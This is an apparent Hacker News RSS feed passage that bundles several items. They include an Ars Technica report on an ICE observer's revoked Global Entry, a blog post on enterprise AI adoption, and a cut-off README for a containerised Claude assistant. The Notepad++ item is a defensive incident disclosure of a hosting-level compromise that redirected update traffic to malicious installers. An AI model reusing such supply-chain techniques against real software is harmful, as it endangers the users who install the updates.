        Global Entry and Precheck revoked three days after incident, court filing says.
      </p>

              
          </div>

    <div>
    
    <p>
      People take part in a march against US Immigration and Customs Enforcement (ICE) in Minneapolis, Minnesota, on January 30, 2026. 

              <span>
          Credit:

          
          Getty Images | Roberto Schmidt

                  </span>
          </p>
  </div>
  </div>
</header>


  

  
      
    
    <div>
                      
                      
          
<p>Minnesota resident Nicole Cleland had her Global Entry and TSA Precheck privileges revoked three days after an incident in which she observed activity by immigration agents, the woman said in a court declaration. An agent told Cleland that he used facial recognition technology to identify her, she wrote in a <a href="https://storage.courtlistener.com/recap/gov.uscourts.mnd.229758/gov.uscourts.mnd.229758.98.0.pdf">declaration</a> filed in US District Court for the District of Minnesota.</p>
<p>Cleland, a 56-year-old resident of Richfield and a director at Target Corporation, volunteers with a group that tracks potential Immigration and Customs Enforcement (ICE) and Customs and Border Protection (CBP) vehicles in her neighborhood, according to her declaration. On the morning of January 10, she “observed a white Dodge Ram being driven by what I believed to be federal enforcement agents” and “maneuvered behind the vehicle with the intent of observing the agents’ actions.”</p>
<p>Cleland said that she and another observer in a different car followed the Dodge Ram because of “concern about a local apartment building being raided.” She followed the car for a short time and from a safe distance until “the Dodge Ram stopped in front of the other commuter’s vehicle,” she wrote. Cleland said two other vehicles apparently driven by federal agents stopped in front of the Dodge Ram, and her path forward was blocked.</p>
<p>“An agent exited the vehicle and approached my vehicle,” Cleland wrote. “I remained in my vehicle. The agent addressed me by my name and informed me that they had ‘facial recognition’ and that his body cam was recording. The agent stated that he worked for border patrol. He wore full camouflage fatigues. The agent stated that I was impeding their work. He indicated he was giving me a verbal warning and if I was found to be impeding again, I would be arrested.”</p>

          
                      
                  </div>
                    
        
          
    
    <div>
          
          
<p>Cleland acknowledged that she heard what the agent said, and they drove off in opposite directions, according to her declaration. Cleland submitted the declaration on January 21 in a <a href="https://storage.courtlistener.com/recap/gov.uscourts.mnd.229758/gov.uscourts.mnd.229758.1.0_4.pdf">lawsuit</a> filed by Minnesota residents against US government officials with the Department of Homeland Security and ICE. Cleland’s court filing was mentioned yesterday in a <a href="https://www.bostonglobe.com/2026/01/29/metro/ice-agents-intimidation-domestic-terrorist-database/">Boston Globe column</a> about tactics used by ICE agents to intimidate protesters.</p>
<h2>Global Entry and Precheck revoked</h2>
<p>Cleland said she could “discern no reason why the agents stopped me other than the fact that I was following them.” But on January 13, she received an email notification that her Global Entry and TSA Precheck privileges for passing through airport security were revoked, she said. Cleland said the revocation appears to be a form of intimidation and retaliation:</p>
<blockquote><p>I logged onto the Global Entry site and the notification letter indicated that indeed my status had been revoked and that they can’t always disclose the reason. The notification did provide some reasons that my status may have changed and the only one that makes sense was “The applicant has been found in violation of any customs, immigration, or agriculture regulations, procedures, or laws in any country.” I was not detained, I was not arrested so [it is] difficult to understand how I was “found in violation.”</p>
<p>I had been a member of the Global Entry program since 2014 without incident. I am not particularly concerned with the revocation of my privileges in isolation. However, given that only three days had passed from the time that I was stopped, I am concerned that the revocation was the result of me following and observing the agents. This is intimidation and retaliation. I was following Legal Observer laws. I [was] within my rights to be doing what I was doing.</p></blockquote>

<p>Cleland said she and her husband travel frequently, and she is worried that they may encounter problems going forward.</p>

          
                  </div>
                    
        
          
    
    <div>

        
        <div>
          
          
<p>“I am concerned that border patrol and other federal enforcement agencies now have my license plate and personal information, and that I may be detained or arrested again in the future,” she wrote. “I am concerned about further actions that could be taken against me or my family. I have instructed my family to be cautious and return inside if they see unfamiliar vehicles outside of our home.”</p>
<p>Cleland said she hasn’t performed any observation of federal agents since January 10, but has “continued to engage in peaceful protests” and is “assessing when I will return to active observations.”</p>
<p>We contacted the Department of Homeland Security about Cleland’s declaration and will update this article if we get a response.</p>
<h2>Extensive use of facial recognition</h2>
<p>Federal agents have made <a href="https://arstechnica.com/tech-policy/2025/10/ices-forced-face-scans-to-verify-citizens-is-unconstitutional-lawmakers-say/">extensive use</a> of facial recognition during President Trump’s immigration crackdown with technology from <a href="https://immpolicytracking.org/policies/reported-ice-contracts-with-clearview-ai-for-facial-recognition-technology/">Clearview AI</a> and a face-scanning app called <a href="https://arstechnica.com/tech-policy/2025/11/us-gives-local-police-a-face-scanning-app-similar-to-one-used-by-ice-agents/">Mobile Fortify</a>. They use facial recognition technology both to verify citizenship and identify protesters.</p>
<p>“Ms. Cleland was one of at least seven American citizens told by ICE agents this month that they were being recorded with facial recognition technology in and around Minneapolis, according to local activists and videos posted to social media,” The New York Times <a href="https://www.nytimes.com/2026/01/30/technology/tech-ice-facial-recognition-palantir.html">reported</a> today, adding that none of the people had given consent to be recorded.</p>
<p>ICE also uses a <a href="https://www.washingtonpost.com/technology/interactive/2026/ice-surveillance-immigrants-protesters/">variety of other technologies</a>, including cell-site simulators (or Stingrays) to track phone locations, and <a href="https://www.404media.co/here-is-the-user-guide-for-elite-the-tool-palantir-made-for-ice/">Palantir software</a> to help identify potential deportation targets.</p>
<p>Although Cleland vowed to continue protesting and eventually get back to observing ICE and CBP agents, her declaration said she felt intimidated after the recent incident.</p>
<p>“The interaction with the agents on January 10th made me feel angry and intimidated,” she wrote. “I have been through Legal Observer Training and know my rights. I believe that I did not do anything that warranted being stopped in the way that I was on January 10th.”</p>


          
                  </div>

                  
          






  <div>
  <div>
          <p><a href="https://arstechnica.com/author/jon-brodkin/"><img src="https://cdn.arstechnica.net/wp-content/uploads/2016/05/j.brodkin-11_2.jpg" alt="Photo of Jon Brodkin"></a></p>
  </div>

  <div>
    

    <p>
      Jon is a Senior IT Reporter for Ars Technica. He covers the telecom industry, Federal Communications Commission rulemakings, broadband consumer affairs, court cases, and government regulation of the tech industry.
    </p>
  </div>
</div>


  <p>
    <a href="https://arstechnica.com/tech-policy/2026/01/ice-protester-says-her-global-entry-was-revoked-after-agent-scanned-her-face/#comments" title="244 comments">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80"><defs><clipPath id="bubble-zero_svg__a"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath><clipPath id="bubble-zero_svg__b"><path fill="none" stroke-width="0" d="M0 0h80v80H0z"></path></clipPath></defs><g clip-path="url(#bubble-zero_svg__a)"><g fill="currentColor" clip-path="url(#bubble-zero_svg__b)"><path d="M80 40c0 22.09-17.91 40-40 40S0 62.09 0 40 17.91 0 40 0s40 17.91 40 40"></path><path d="M40 40 .59 76.58C-.67 77.84.22 80 2.01 80H40z"></path></g></g></svg>
    244 Comments
  </a>
      </p>
              </div>
  </article>


  


  


  <div>
    <header>
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 26"><defs><clipPath id="most-read_svg__a"><path fill="none" d="M0 0h40v26H0z"></path></clipPath><clipPath id="most-read_svg__b"><path fill="none" d="M0 0h40v26H0z"></path></clipPath></defs><g clip-path="url(#most-read_svg__a)"><g fill="none" clip-path="url(#most-read_svg__b)"><path fill="currentColor" d="M20 2h.8q1.5 0 3 .6c.6.2 1.1.4 1.7.6 1.3.5 2.6 1.3 3.9 2.1.6.4 1.2.8 1.8 1.3 2.9 2.3 5.1 4.9 6.3 6.4-1.1 1.5-3.4 4-6.3 6.4-.6.5-1.2.9-1.8 1.3q-1.95 1.35-3.9 2.1c-.6.2-1.1.4-1.7.6q-1.5.45-3 .6h-1.6q-1.5 0-3-.6c-.6-.2-1.1-.4-1.7-.6-1.3-.5-2.6-1.3-3.9-2.1-.6-.4-1.2-.8-1.8-1.3-2.9-2.3-5.1-4.9-6.3-6.4 1.1-1.5 3.4-4 6.3-6.4.6-.5 1.2-.9 1.8-1.3q1.95-1.35 3.9-2.1c.6-.2 1.1-.4 1.7-.6q1.5-.45 3-.6zm0-2h-1c-1.2 0-2.3.3-3.4.6-.6.2-1.3.4-1.9.7-1.5.6-2.9 1.4-4.3 2.3-.7.5-1.3.9-1.9 1.4C2.9 8.7 0 13 0 13s2.9 4.3 7.5 7.9c.6.5 1.3 1 1.9 1.4 1.3.9 2.7 1.7 4.3 2.3.6.3 1.3.5 1.9.7 1.1.3 2.3.6 3.4.6h2c1.2 0 2.3-.3 3.4-.6.6-.2 1.3-.4 1.9-.7 1.5-.6 2.9-1.4 4.3-2.3.7-.5 1.3-.9 1.9-1.4C37.1 17.3 40 13 40 13s-2.9-4.3-7.5-7.9c-.6-.5-1.3-1-1.9-1.4-1.3-.9-2.8-1.7-4.3-2.3-.6-.3-1.3-.5-1.9-.7C23.3.4 22.1.1 21 .1h-1"></path><path fill="#ff4e00" d="M20 5c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8m0 11c-1.7 0-3-1.3-3-3s1.3-3 3-3 3 1.3 3 3-1.3 3-3 3"></path></g></g></svg>
      
    </header>
    <ol>
              <li>
                      <a href="https://arstechnica.com/information-technology/2026/01/ai-agents-now-have-their-own-reddit-style-social-network-and-its-getting-weird-fast/">
              <img src="https://cdn.arstechnica.net/wp-content/uploads/2026/01/moltbook-blue-v-red-768x432.jpg" alt="Listing image for first story in Most Read: AI agents now have their own Reddit-style social network, and it's getting weird fast" decoding="async" loading="lazy">
            </a>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                    <li>
                    
        </li>
                  </ol>
</div>
  </main>





  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Notepad++ hijacked by state-sponsored actors (769 pts)]]></title>
            <link>https://notepad-plus-plus.org/news/hijacked-incident-info-update/</link>
            <guid>46851548</guid>
            <pubDate>Mon, 02 Feb 2026 01:59:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://notepad-plus-plus.org/news/hijacked-incident-info-update/">https://notepad-plus-plus.org/news/hijacked-incident-info-update/</a>, See on <a href="https://news.ycombinator.com/item?id=46851548">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">
    
    <p>2026-02-02</p>

<p>Following the security disclosure published in the v8.8.9 announcement<br>
<a href="https://notepad-plus-plus.org/news/v889-released/">https://notepad-plus-plus.org/news/v889-released/</a><br>
the investigation has continued in collaboration with external experts and with the full involvement of my (now former) shared hosting provider.</p>

<p>According to the analysis provided by the security experts, the attack involved infrastructure-level compromise that allowed malicious actors to intercept and redirect update traffic destined for notepad-plus-plus.org. The exact technical mechanism remains under investigation, though the compromise occured at the hosting provider level rather than through vulnerabilities in Notepad++ code itself. Traffic from certain targeted users was selectively redirected to attacker-controlled served malicious update manifests.</p>

<p>The incident began from June 2025. Multiple independaent security researchers have assessed that the threat acotor is likely a Chinese state-sponsored group, which would explain the highly selective targeting obseved during the campaign.</p>

<p>An incident-response (IR) plan was proposed by the security expert, and I facilitated direct communication between the hosting provider and the IR team. After the IR team engaged with the provider and reviewed the situation, I received the following detailed statement from the provider:</p>

<pre><code>Dear Customer,
We want to further update you following the previous communication with us about your server compromise and further investigation with your incident response team.
We discovered the suspicious events in our logs, which indicate that the server (where your application https://notepad-plus-plus.org/update/getDownloadUrl.php was hosted until the 1st of December, 2025) could have been compromised.
As a precautionary measure, we immediately transferred all clients’ web hosting subscriptions from this server to a new server and continued our further investigation.
Here are the key finding points:
1. The shared hosting server in question was compromised until the 2nd of September, 2025. On this particular date, the server had scheduled maintenance where the kernel and firmware were updated. After this date, we could not identify any similar patterns in logs, and this indicates that bad actors have lost access to the server. We also find no evidence of similar patterns on any other shared hosting servers.
2. Even though the bad actors have lost access to the server from the 2nd of September, 2025, they maintained the credentials of our internal services existing on that server until the 2nd of December, which could have allowed the malicious actors to redirect some of the traffic going to https://notepad-plus-plus.org/getDownloadUrl.php to their own servers and return the updates download URL with compromised updates.
3. Based on our logs, we see no other clients hosted on this particular server being targeted. The bad actors specifically searched for https://notepad-plus-plus.org/ domain with the goal to intercept the traffic to your website, as they might know the then-existing Notepad++ vulnerabilities related to insufficient update verification controls.
4. After concluding our research, the investigated security findings were no longer observed in the web hosting systems from the 2nd of December, 2025, and onwards, as:
* We have fixed vulnerabilities, which could have been used to target Notepad++. In particular, we do have logs indicating that the bad actor tried to re-exploit one of the fixed vulnerabilities; however, the attempt did not succeed after the fix was implemented.
* We have rotated all the credentials that bad actors could have obtained until the 2nd of September, 2025.
* We have checked the logs for similar patterns in all web hosting servers and couldn’t find any evidence of systems being compromised, exploited in a similar way, or data breached.
While we have rotated all the secrets on our end, below you will find the preventive actions you should take to maximize your security. However, if below actions have been done after the 2nd of December, 2025, no actions are needed from your side.
* Change credentials for SSH, FTP/SFTP, and MySQL database.
* Review administrator accounts for your WordPress sites (if you have any), change their passwords, and remove unnecessary users.
* Update your WordPress sites (if you have any) plugins, themes, and core version, and turn on automatic updates, if applicable.
We appreciate your cooperation and understanding. Please let us know in case you have any questions.
</code></pre>

<p><strong>TL;DR</strong><br>
According to the former hosting provider, the shared hosting server was compromised until September 2, 2025. Even after losing server access, attackers maintained credentials to internal services until December 2, 2025, which allowed them to continue redirecting Notepad++ update traffic to malicious servers. The attackers specifically targeted Notepad++ domain with the goal of exploiting insufficient update verification controls that existed in older versions of Notepad++.
All remediation and security hardening were completed by the provider by December 2, 2025, successfully blocking further attacker activity.</p>

<p><strong>Note on timelines:</strong> The security exper’s analysis indicates the attack ceased on November 10, 2025, while the hosting provider’s statement shows potential attacker access until December 2, 2025. Based on both assessment, I estimate the overall compromise period spanned from June through December 2, 2025, when all attacker access was definitively terminated.</p>

<p>I deeply apologize to all users affected by this hijacking. To address this this severe security issue, the Notepad++ website has been migrated to a new hosting provider with significantly stronger security practices.
Within Notepad++ itself, WinGup (the updater) was enhanced in v8.8.9 to verify both the certificate and the signature of the downloaded installer. Additionally, the XML returned by the update server is now singed (XMLDSig), and the certificate &amp; signature verification will be enforced starting with upcoming v8.9.2, expected in about one month.</p>

<p>With these changes and reinforcements, I believe the situation has been fully resolved.
Fingers crossed.</p>



  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Actors: A Model of Concurrent Computation [pdf] (1985) (120 pts)]]></title>
            <link>https://apps.dtic.mil/sti/tr/pdf/ADA157917.pdf</link>
            <guid>46851192</guid>
            <pubDate>Mon, 02 Feb 2026 01:11:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://apps.dtic.mil/sti/tr/pdf/ADA157917.pdf">https://apps.dtic.mil/sti/tr/pdf/ADA157917.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=46851192">Hacker News</a></p>
Couldn't get https://apps.dtic.mil/sti/tr/pdf/ADA157917.pdf: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Wikipedia as a doomscrollable social media feed (342 pts)]]></title>
            <link>https://xikipedia.org</link>
            <guid>46850803</guid>
            <pubDate>Mon, 02 Feb 2026 00:12:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xikipedia.org">https://xikipedia.org</a>, See on <a href="https://news.ycombinator.com/item?id=46850803">Hacker News</a></p>
<div id="readability-page-1" class="page"><p id="loading">Loading...</p><div id="startScreen" popover="manual">
        <p><h2>by <a href="https://lyra.horse/">rebane2001</a></h2></p>
        <p><strong>Xikipedia</strong> is a pseudo social media feed that algorithmically shows you content from <a href="https://simple.wikipedia.org/">Simple Wikipedia</a>. It is made as a demonstration of how even a basic non-ML algorithm with no data from other users can quickly learn what you engage with to suggest you more similar content. No data is collected or shared here, the algorithm runs locally and the data disappears once you refresh or close the tab.</p>
        <p>Source code on <a href="https://github.com/rebane2001/xikipedia">GitHub</a>, discuss on <a href="https://infosec.exchange/@rebane2001/115998023365214091">fedi</a>, <a href="https://bsky.app/profile/rebane2001.bsky.social/post/3mdtj5cc7pk2b">bluesky</a>, or <a href="https://twitter.com/rebane2001/status/2018107789512474738">twitter</a>.</p>
        <!--<p style="margin-top:0">Page loading slow? <a href="https://twitter.com/rebane2001/status/2018140570477023708">This</a> is probably why lol.</p>-->
        <p>Pick some categories to get started (optional)</p>
        
        <p>Or add your own</p>
        
        <p>Since the content and images shown is from random Wikipedia articles, you will likely see NSFW content. Please only continue if you're an adult.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Two kinds of AI users are emerging (294 pts)]]></title>
            <link>https://martinalderson.com/posts/two-kinds-of-ai-users-are-emerging/</link>
            <guid>46850588</guid>
            <pubDate>Sun, 01 Feb 2026 23:45:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://martinalderson.com/posts/two-kinds-of-ai-users-are-emerging/">https://martinalderson.com/posts/two-kinds-of-ai-users-are-emerging/</a>, See on <a href="https://news.ycombinator.com/item?id=46850588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <p>It still shocks me how much difference there is between AI users. I think it explains a lot about the often confusing (to me) coverage in the media about AI and its productivity impact.</p>
<p>I think it's clear there are two types of users to me now, and by extension, the organisations they work for.</p>
<p>First, you have the "power users", who are all in on adopting new AI technology - Claude Code, MCPs, skills, etc. Surprisingly, these people are often <em>not very technical</em>. I've seen far more non-technical people than I'd expect using Claude Code in terminal, using it for dozens of non-SWE tasks. Finance roles seem to be getting enormous value out of it (unsurprisingly, as Excel on the finance side is remarkably limiting when you start getting used to the power of a full programming ecosystem like Python).</p>
<p>Secondly, you have the people who are generally only chatting to ChatGPT or similar. <em>So many</em> people I wouldn't expect are still in this camp.</p>
<h2>M365 Copilot has a lot to answer for</h2>
<p>One extremely jarring realisation was just how poor Microsoft Copilot is. It has <em>enormous</em> market share in enterprise as it is bundled in with various Office 365 subscriptions, yet feels like a poorly cloned version of the (already not great) ChatGPT interface. The "agent" feature is absolutely laughable compared to what a CLI coding agent (including Microsoft's own GitHub confusingly-named-Copilot CLI).</p>
<blockquote>
<p>To really underline this, Microsoft itself is rolling out Claude Code to internal teams<sup><a href="#fn1" id="fnref1">[1]</a></sup>, despite (obviously) having access to Copilot at near zero cost, and significant ownership of OpenAI. I think this sums up quite how far behind they are</p>
</blockquote>
<p>The problem is that in enterprise Copilot is often the only allowed AI tool, so that's all you can use without either potentially losing your job or spending a lot of effort trying to procure and use another AI tool. It's slow, the code execution tool in it doesn't work properly and fails horribly with large(ish) files, seemingly due to very very aggressive memory and CPU limitations.</p>
<p>This is becoming an existential risk for many enterprises. Senior decision makers are no doubt using these tools with such poor results and are therefore writing off AI, and/or spending a fortune with various large consulting and management consultancy outfits to get not very far.</p>
<h2>Why enterprise is so at risk</h2>
<p>Enterprise corporate IT policy results in a completely disastrous combination of limitations that basically ensure that people cannot successfully use more 'cutting edge' AI tooling.</p>
<p>Firstly, they tend to have extremely locked down environments, with no ability to run even a basic script interpreter locally (VBA if you are lucky, but even that may be limited by various Group Policies). Secondly, they're locked into legacy software with no real "internal facing" APIs on their core workflows, which means agents have nothing to connect to even if you could run them.</p>
<p>Finally, they tend to have extremely siloed engineering departments (which may be completely outsourced), so there's nobody internally who could build the infrastructure to run safely sandboxed agents even if they wanted to.</p>
<p>The security concerns are real. You definitely do not want people YOLOing coding agents over production databases with no control, and <a href="https://martinalderson.com/posts/why-sandboxing-coding-agents-is-harder-than-you-think/">as I've covered</a>, sandboxing agents is <em>difficult</em><sup><a href="#fn2" id="fnref2">[2]</a></sup>.</p>
<p>However, this does cause a real problem in so much that you don't have an engineering team that can help build the infrastructure to run safely sandboxed agents against your datasets.</p>

<p>I've also spoken to many smaller companies that don't have all this baggage and are <em>absolutely flying</em> with AI. The gap is so obvious when you can see both sides of it.</p>
<p>On one hand, you have Microsoft's (awful) Copilot integration for Excel (in fairness, the Gemini integration in Google Sheets is also bad). So you can imagine financial directors trying to use it and it making a complete mess of the most simple tasks and never touching it again.</p>
<p>On the other you have a non-technical executive who's got his head round Claude Code and can run e.g. Python locally. I helped one recently almost one-shot<sup><a href="#fn3" id="fnref3">[3]</a></sup> converting a 30 sheet mind numbingly complicated Excel financial model to Python with Claude Code.</p>
<p>Once the model is in Python, you effectively have a data science team in your pocket with Claude Code. You can easily run Monte Carlo simulations, pull external data sources as inputs, build web dashboards and have Claude Code work with you to really integrate weaknesses in your model (or business). It's a pretty magical experience watching someone realise they have so much power at their fingertips, without having to grind away for hours/days in Excel.</p>
<p>This effectively leads to a situation where smaller company employees are able to be <em>so much</em> more productive than the equivalent at an enterprise. It often used to be that people at small companies really envied the resources &amp; teams that their larger competitors had access to - but increasingly I think the pendulum is swinging the other way.</p>
<h2>The future</h2>
<p>I'm starting to get a feel for what the future of work looks like. The first observation is that (often) the real leaps are being made organically by employees, not from a top down AI strategy. Where I see the real productivity gains are small teams deciding to try and build an AI assisted workflow for a process, and as they are the ones that know that process inside out they can get very good results - unlike an often outsourced software engineering team who have absolutely zero experience doing the process that they are helping automate. I think this is the opposite of what most 'digital transformation' projects looked like in enterprise.</p>
<p>Secondly, companies that have some sort of APIs for <em>internal</em> systems are going to be able to do far more than those that don't. This might be as simple as a readonly data warehouse employees can connect to and run queries on behalf of users, or it could be as far as many complex core business processes being completely APId.</p>
<p>Thirdly, this all needs to be wrapped up in some sort of secure mechanism, but I actually think a hosted VM running some sort of code agent with well thought through network restrictions would work well, at least for read only reporting. For creating and editing data I don't think we quite have the model for non technical users (especially) to be able to use agents safely (yet).</p>
<p>Finally, legacy enterprise SaaS players either have enormous lock in, or are extremely vulnerable depending on how you look at it. Most are not "API-first" products, and the APIs they have tend to be really for developer usage - not optimised for thousands of employees to ping in weird and wonderful inefficient ways. But if they are the source of truth for the company, they are going to be very difficult to migrate away from <em>and</em> bottleneck a lot of productivity gains.</p>
<p>Again, smaller companies tend to use newer products which have far better thought through APIs (simply because they weren't often originally created many decades ago with various interfaces grafted on over time).</p>
<p><img src="https://martinalderson.com/img/future-of-work-flowchart.png" alt="The future of knowledge work - user prompting an agent that connects to systems via APIs and generates outputs"></p><blockquote>
<p>The user prompts, the agent synthesises - connecting to APIs and producing outputs on demand.</p>
</blockquote>
<p>What I've come to realise is that the power of having a <a href="https://martinalderson.com/posts/why-im-building-my-own-clis-for-agents/">bash sandbox</a> with a programming language and API access to systems, combined with an agentic harness, results in outrageously good results for non technical users. It can effectively replace nearly every standard productivity app out there - both classic Microsoft Office style ones - and also web apps. It can build any report you ask for - and export it however you like. To me this seems like the future of knowledge work.</p>
<p>The bifurcation is real and seems to be, if anything, speeding up dramatically. I don't think there's ever been a time in history where a tiny team can outcompete a company one thousand times its size so easily.</p>
<hr>
<section>
<ol>
<li id="fn1"><p><a href="https://blog.devgenius.io/microsoft-is-using-claude-code-internally-while-selling-you-copilot-d586a35b32f9">Microsoft is using Claude Code internally while selling you Copilot</a> <a href="#fnref1">↩︎</a></p>
</li>
<li id="fn2"><p>Let's keep in mind that users already have access to these systems. CISOs need to figure out how to enable these kind of secure VMs en masse. There's already precedent for this with Codespaces - it just requires a similar approach scaled up to the entire organisation. <a href="#fnref2">↩︎</a></p>
</li>
<li id="fn3"><p>Two or three prompts got it there, using plan mode to figure out the structure of the Excel sheet, then prompting to implement it. It even added unit tests to the Python model itself, which I was impressed with! <a href="#fnref3">↩︎</a></p>
</li>
</ol>
</section>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: NanoClaw – “Clawdbot” in 500 lines of TS with Apple container isolation (461 pts)]]></title>
            <link>https://github.com/gavrielc/nanoclaw</link>
            <guid>46850205</guid>
            <pubDate>Sun, 01 Feb 2026 22:49:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/gavrielc/nanoclaw">https://github.com/gavrielc/nanoclaw</a>, See on <a href="https://news.ycombinator.com/item?id=46850205">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/gavrielc/nanoclaw/blob/main/assets/nanoclaw-logo.png"><img src="https://github.com/gavrielc/nanoclaw/raw/main/assets/nanoclaw-logo.png" alt="NanoClaw" width="400"></a>
</p>
<p dir="auto">
  My personal Claude assistant that runs securely in Apple containers. Lightweight and built to be understood and customized for your own needs.
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why I Built This</h2><a id="user-content-why-i-built-this" aria-label="Permalink: Why I Built This" href="#why-i-built-this"></a></p>
<p dir="auto"><a href="https://github.com/openclaw/openclaw">OpenClaw</a> is an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.</p>
<p dir="auto">NanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/gavrielc/nanoclaw.git
cd nanoclaw
claude"><pre>git clone https://github.com/gavrielc/nanoclaw.git
<span>cd</span> nanoclaw
claude</pre></div>
<p dir="auto">Then run <code>/setup</code>. Claude Code handles everything: dependencies, authentication, container setup, service configuration.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto"><strong>Small enough to understand.</strong> One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.</p>
<p dir="auto"><strong>Secure by isolation.</strong> Agents run in Linux containers (Apple Container). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your Mac.</p>
<p dir="auto"><strong>Built for one user.</strong> This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.</p>
<p dir="auto"><strong>Customization = code changes.</strong> No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.</p>
<p dir="auto"><strong>AI-native.</strong> No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.</p>
<p dir="auto"><strong>Skills over features.</strong> Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contribute skills like <code>/add-telegram</code> that transform your fork. You end up with clean code that does exactly what you need.</p>
<p dir="auto"><strong>Best harness, best model.</strong> This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.</p>
<p dir="auto"><strong>No ToS gray areas.</strong> Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What It Supports</h2><a id="user-content-what-it-supports" aria-label="Permalink: What It Supports" href="#what-it-supports"></a></p>
<ul dir="auto">
<li><strong>WhatsApp I/O</strong> - Message Claude from your phone</li>
<li><strong>Isolated group context</strong> - Each group has its own <code>CLAUDE.md</code> memory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted</li>
<li><strong>Main channel</strong> - Your private channel (self-chat) for admin control; every other group is completely isolated</li>
<li><strong>Scheduled tasks</strong> - Recurring jobs that run Claude and can message you back</li>
<li><strong>Web access</strong> - Search and fetch content</li>
<li><strong>Container isolation</strong> - Agents sandboxed in Apple containers</li>
<li><strong>Optional integrations</strong> - Add Gmail (<code>/add-gmail</code>) and more via skills</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto">Talk to your assistant with the trigger word (default: <code>@Andy</code>):</p>
<div data-snippet-clipboard-copy-content="@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing"><pre><code>@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing
</code></pre></div>
<p dir="auto">From the main channel (your self-chat), you can manage groups and tasks:</p>
<div data-snippet-clipboard-copy-content="@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group"><pre><code>@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Customizing</h2><a id="user-content-customizing" aria-label="Permalink: Customizing" href="#customizing"></a></p>
<p dir="auto">There are no configuration files to learn. Just tell Claude Code what you want:</p>
<ul dir="auto">
<li>"Change the trigger word to @Bob"</li>
<li>"Remember in the future to make responses shorter and more direct"</li>
<li>"Add a custom greeting when I say good morning"</li>
<li>"Store conversation summaries weekly"</li>
</ul>
<p dir="auto">Or run <code>/customize</code> for guided changes.</p>
<p dir="auto">The codebase is small enough that Claude can safely modify it.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><strong>Don't add features. Add skills.</strong></p>
<p dir="auto">If you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (<code>.claude/skills/add-telegram/SKILL.md</code>) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.</p>
<p dir="auto">Users then run <code>/add-telegram</code> on their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">RFS (Request for Skills)</h3><a id="user-content-rfs-request-for-skills" aria-label="Permalink: RFS (Request for Skills)" href="#rfs-request-for-skills"></a></p>
<p dir="auto">Skills we'd love to see:</p>
<p dir="auto"><strong>Communication Channels</strong></p>
<ul dir="auto">
